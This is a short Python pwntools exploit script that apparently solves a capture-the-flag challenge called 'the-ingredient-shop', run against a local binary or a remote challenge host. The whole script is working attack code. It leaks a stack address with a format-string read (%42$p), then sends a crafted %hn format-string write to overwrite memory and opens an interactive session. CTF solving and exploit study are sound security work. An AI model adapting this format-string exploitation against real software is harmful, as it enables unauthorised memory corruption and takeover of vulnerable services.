#!/usr/bin/python3
from pwn import *

payload1 = b'%42$p'
payload1 += b'\n'

USE_REMOTE = False
REMOTE_HOST = "the-ingredient-shop-7a184a847c78c12b.challs.brunnerne.xyz"
REMOTE_PORT = 443


if USE_REMOTE:
    p= remote(REMOTE_HOST, REMOTE_PORT, ssl=True)
else:
    e = ELF("./shop")
    p = e.process()

#input()

print(p.readuntil("3) exit\n").decode())
p.write(payload1)
p.readuntil("choice\n")
address = p.readline().decode()
address_hex= bytes.fromhex(address[2:])

print("line: ",address)

less_sig_bit = address_hex[-1]&0xff
bsp_add = address_hex[:-1]+(less_sig_bit-8).to_bytes()
bsp_add = bsp_add[::-1]
print("     ", bsp_add, " ", len(bsp_add))

#409-6
payload2=b'%16c'+bsp_add+b'%8$hn'+b'\n'
        #  0123456789012345
payload3=b'%410c%10$hnAAaaa'+bsp_add+b'\x00\x00\n'

print(p.readuntil("3) exit\n").decode())
p.write(payload3)
p.interactive()

